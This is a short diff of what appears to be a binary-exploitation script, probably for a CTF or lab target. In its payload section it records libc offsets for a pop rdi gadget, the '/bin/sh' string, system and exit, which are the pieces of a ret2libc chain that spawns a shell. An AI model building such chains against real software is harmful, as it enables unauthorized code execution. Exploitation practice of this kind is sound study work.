@@ -30,9 +30,11 @@ if GDB and LOCAL:
 ###   PAYLOAD  ####
 ###################
 
-# 0x000000000040115d: pop rbp; ret;
-# 0x00007ffff7db33e5: pop rdi; ret;
-# pop_rbp = 0x000000000040115d 
+# 0x000000000002a3e5: pop rdi; ret;
+# 0x00000000001d8678: /bin/sh
+# 0x0000000000050d70: system
+# 0x00000000000455f0: exit
+
 
 RET = 0x40115e
 # POP_RDI = 0x00007ffff7db33e5
